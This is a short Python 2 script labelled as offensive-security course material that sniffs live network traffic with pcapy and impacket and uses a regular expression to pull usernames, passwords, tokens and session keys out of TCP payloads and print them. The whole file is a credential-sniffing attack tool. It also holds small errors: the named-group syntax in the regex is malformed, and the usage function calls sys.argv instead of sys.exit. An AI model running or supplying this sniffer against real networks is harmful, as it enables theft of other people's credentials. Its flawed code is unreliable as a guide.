# Offensive Security Software
# SSE Program
# Attack: Password Sniffer
# Date: January 31, 2016

import sys
import re
import getopt
import pcapy
from impacket.ImpactDecoder import EthDecoder, IPDecoder, TCPDecoder

#Interface to sniff on
dev = "en0"

#Pcap filter
filter = "tcp"

#Decoder for all layers
eth_dec = EthDecoder()
ip_dec = IPDecoder()
tcp_dec = TCPDecoder()

#Patters that match usernames and passwords
pattern = re.compile(r"""(P<found>(USER|USERNAME|PASS|PASSWORD|Password|Pass|pass|LOGIN|BENUTZER|PASSWORT|AUTH|ACCESS|ACCESS_?KEY
|SESSION|SESSION_?KEY|TOKEN) [=:\s].+)\b""",re.MULTILINE|re.IGNORECASE)

# This function will be called for every packet, decode it, and try to find a username or password in it
def handle_packet(hdr, data):
    eth_pkt = eth_dec.decode(data)
    ip_pkt = ip_dec.decode(eth_pkt.get_data_as_string())
    tcp_pkt = tcp_dec.decode(ip_pkt.get_data_as_string())
    payload = ip_pkt.get_data_as_string()

    match = re.search(pattern, payload)
    if not tcp_pkt.get_SYN() and not tcp_pkt.get_RST() and \
       not tcp_pkt.get_FIN() and match and \
       match.groupdict()['found'] != None:
        print "\t%s\n" % (match.groupdict()['found'])

def usage():
    print sys.argv[0] + " -i <dev> -f <pcap_filter>"
    sys.argv(1)

#Parsing parameter
try:
    cmd_opts = "f:i:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-f":
        filter = opt[1]
    elif opt[0] == "-i":
        dev = opt[1]
    else:
        usage()

# Start sniffing
pcap = pcapy.open_live(dev, 1500, 0, 100)
pcap.setfilter(filter)
print "Sniffing passwords on " + str(dev)
pcap.loop(0, handle_packet)
